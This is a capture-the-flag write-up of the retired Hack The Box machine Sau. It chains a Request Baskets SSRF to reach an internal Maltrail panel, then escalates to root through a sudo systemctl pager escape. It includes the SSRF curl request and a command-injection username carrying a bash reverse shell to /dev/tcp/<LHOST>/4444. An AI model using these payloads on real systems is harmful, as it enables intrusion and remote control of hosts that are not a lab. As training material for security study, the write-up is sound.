---
machine: Sau
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / SSRF
state: Retired
tags: [ssrf, request-baskets, maltrail, cve-2023-27163, systemctl, less]
---

# Sau — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

A two-hop chain: **Request Baskets 1.2.1** on 55555 with **SSRF** (CVE-2023-27163) reaches a **Maltrail 0.53** that only listens on `127.0.0.1:80`; its command injection in the login `username` field gives a shell as `puma` (public huntr advisory and `spookier` PoC; sources cite it both as CVE-2023-27148 and as CVE-2023-31543, so the flaw is named without picking an identifier). Escalation is `sudo systemctl status` → **`less` pager** → `!sh`.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
55555/tcp open  http    Golang net/http (request-baskets 1.2.1)
```

Port 80 is filtered; the page footer reads `request-baskets | Version: 1.2.1`.

## Access

1. **SSRF**: create a basket whose `forward_url` points at internal `localhost`.

```bash
curl -X POST http://<IP>:55555/api/baskets/proxy \
  -H 'Content-Type: application/json' \
  -d '{"forward_url":"http://127.0.0.1:80","proxy_response":true}'
```

2. **Maltrail 0.53** is now reachable at `http://<IP>:55555/proxy`. The injection rides the login username:

```bash
# /login with username: ;bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';
```

3. Shell as **`puma`**.

## Escalation

```bash
sudo -l
```

```text
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

`systemctl status` opens the pager while keeping privileges; from `less`:

```text
!/bin/sh
```

That is the behaviour described in CVE-2023-26604.

## Pitfalls

- **`proxy_response`**: without it the basket forwards but does not return the body.
- **Filtered port**: the public host never reaches 80; everything goes through the proxy.
- **`systemctl` without a TTY**: the pager needs a real terminal; over non-interactive SSH use `-t`.

## Lessons

- SSRF turns an internal service into an external one: the firewall stops protecting.
- A panel with command injection and default credentials is instant RCE.
- `sudo` on tools with a pager or editor is command execution as root.
